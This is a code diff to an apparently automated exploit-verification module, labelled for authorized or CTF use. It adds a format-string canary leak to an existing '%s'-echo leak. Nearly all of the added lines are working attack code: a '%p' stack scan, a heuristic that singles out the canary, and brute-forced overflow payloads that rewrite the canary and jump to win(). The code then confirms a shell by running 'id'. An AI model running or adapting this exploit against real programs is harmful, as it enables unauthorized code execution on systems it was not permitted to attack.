@@ -1,11 +1,19 @@
 """Stack-canary bypass via leak, verified by execution.
 
 A stack canary stops a linear overflow (it is checked before `ret`), UNLESS the program also
-leaks the canary. The classic primitive: a buffer printed with `%s` right after a read that can
-overwrite the canary's null least-significant byte -- overwriting that 0x00 makes `%s` keep going
-and print the upper 7 canary bytes. We recover `canary = 0x00 | leaked7`, then a second overflow
-rewrites the SAME canary value in place and continues past it to `win()`. For AUTHORIZED / CTF.
-Runs in the shared sandbox (Docker image or native fallback)."""
+leaks the canary. Two leak shapes are tried, both verified by getting a shell:
+
+  Strategy A -- `%s`-echo leak: a buffer printed with `%s` right after a read that can overwrite
+  the canary's null least-significant byte. Overwriting that 0x00 makes `%s` keep going and print
+  the upper 7 canary bytes; we recover `canary = 0x00 | leaked7`.
+
+  Strategy B -- format-string leak (the most common real-world shape): the program does
+  `printf(user_input)`, so a positional `%p` scan prints stack slots. We pick the canary-like
+  value (low byte 0x00, enough entropy, not an obvious code/stack/libc pointer).
+
+Either way, a second overflow in the SAME process (the canary is re-randomized per exec, even
+with ASLR off) rewrites the SAME canary value in place and continues past it to `win()`. For
+AUTHORIZED / CTF only. Runs in the shared sandbox (Docker image or native fallback)."""
 from __future__ import annotations
 
 from ._sandbox import run_driver
@@ -76,6 +84,69 @@ for bufsz in (72, 64, 56, 88, 40, 48, 80, 96, 104, 112, 120, 128, 32):
                     if io: io.close()
                 except Exception:
                     pass
+
+# Strategy B -- FORMAT-STRING canary leak (the most common real-world shape): the program does
+# printf(user_input), so a positional scan (%p...) prints stack slots, among them the canary.
+# The canary and the overflow MUST happen in the SAME process (the canary is re-randomized per
+# exec even with ASLR off), so each attempt re-leaks and then overflows in one process. The
+# positional INDEX of the canary is stable across runs, so `rank` selects the k-th canary-like
+# value (low byte 0x00, not an obvious code/stack/libc pointer) consistently.
+import re as _re
+def _canary_like(toks):
+    out = []
+    for t in toks:
+        try:
+            v = int(t, 16)
+        except Exception:
+            continue
+        if (v & 0xff) != 0 or v < 0x100000000:
+            continue                                   # canary LSB is 0x00; skip small/flat-binary values
+        if (v & 0xffffff00) == 0:
+            continue                                   # skip byte<<N artifacts (e.g. 0xb500000000): a real canary's low bytes are random
+        if (v >> 40) in (0x55, 0x56, 0x7e, 0x7f) or (v >> 44) == 0x7:
+            continue                                   # skip PIE/stack/libc pointers
+        if v not in out:
+            out.append(v)
+    return out
+SCAN = b"%p." * 60 + b"\n"      # sequential scan; 180B stays within typical input buffers
+for rank in range(5):
+    for bufsz in (72, 64, 56, 88, 40, 48, 80, 96, 104, 120, 264, 256, 272, 280, 136, 152, 168, 200):
+        for rbpgap in (8, 0, 16):
+            for align in ((ret,) if ret else (None,)) + ((None,) if ret else ()):
+                io = None
+                try:
+                    io = process([elf.path], aslr=False, stderr=STDOUT)
+                    io.send(SCAN)
+                    try:
+                        out = io.recvrepeat(0.6)
+                    except Exception:
+                        out = b""
+                    cands = _canary_like(_re.findall(rb"0x[0-9a-fA-F]+", out))
+                    if len(cands) <= rank:
+                        io.close(); continue
+                    canary = cands[rank]
+                    tail = (p64(align) if align else b"") + p64(win)
+                    io.send(b"A" * bufsz + p64(canary) + b"A" * rbpgap + tail)
+                    dbg = b""
+                    try:
+                        dbg += io.recvrepeat(1.0)
+                    except Exception:
+                        pass
+                    io.sendline(b"echo " + MARK + b"; id")
+                    try:
+                        dbg += io.recvrepeat(1.5)
+                    except Exception:
+                        pass
+                    io.close()
+                    if MARK in dbg or b"uid=" in dbg:
+                        print("VERIFIED(fmt) bufsz=%d rbpgap=%d align=%s canary=%#x win=%#x rank=%d"
+                              % (bufsz, rbpgap, "ret" if align else "none", canary, win, rank))
+                        sys.exit(0)
+                except Exception:
+                    try:
+                        if io: io.close()
+                    except Exception:
+                        pass
 print("NOT_VERIFIED")
 sys.exit(1)
 '''
